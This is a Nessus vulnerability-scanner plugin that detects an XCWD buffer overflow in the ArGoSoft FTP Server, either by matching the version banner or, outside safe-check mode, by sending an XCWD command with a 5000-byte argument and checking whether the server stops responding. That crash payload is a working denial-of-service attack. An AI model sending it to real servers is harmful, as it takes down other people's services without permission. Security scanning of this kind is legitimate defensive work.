#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
#  (C) Tenable Network Security
#
#  Ref: Moran Zavdi <moran@moozatech.com>
#
#  This script is released under the GNU GPL v2
#

if(description)
{
 script_id(15439);
 script_bugtraq_id(8704);
 if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:2618);
 script_version ("$Revision: 1.2 $");

 name["english"] = "ArGoSoft FTP Server XCWD Overflow";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running the ArGoSoft FTP server.

It was possible to shut down the remote FTP server by issuing
a XCWD command followed by a too long argument.

This problem allows an attacker to prevent the remote site i
from sharing some resources with the rest of the world.

Solution : Upgrade to 1.4.1.2 or newer
Risk factor : Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Attempts a XCWD buffer overflows";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
  
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");
port = get_kb_item("Services/ftp");
if(!port)port = 21;

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");


if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
    if (safe_checks() || ! login)
    {
    	banner = get_ftp_banner(port: port);
	if ( ! banner ) exit(0);
	#220 ArGoSoft FTP Server for Windows NT/2000/XP, Version 1.4 (1.4.1.1)
	if (egrep(pattern:".*ArGoSoft FTP Server .* Version .* \((0\.|1\.([0-3]\.|4(\.0|\.1\.[01])))\).*", string:banner) ) security_warning(port);
	exit(0);
    }
    else
    {
      if(ftp_authenticate(socket:soc, user:login, pass:password))
      {
   	s = string("XCWD ", crap(5000), "\r\n");
   	send(socket:soc, data:s);
   	r = recv_line(socket:soc, length:1024);
   	close(soc);
       
        soc = open_sock_tcp(port);
        if(!soc)
        {
          security_warning(port);
     	  exit(0);
        }
      }
      close(soc);
    }
  }
}
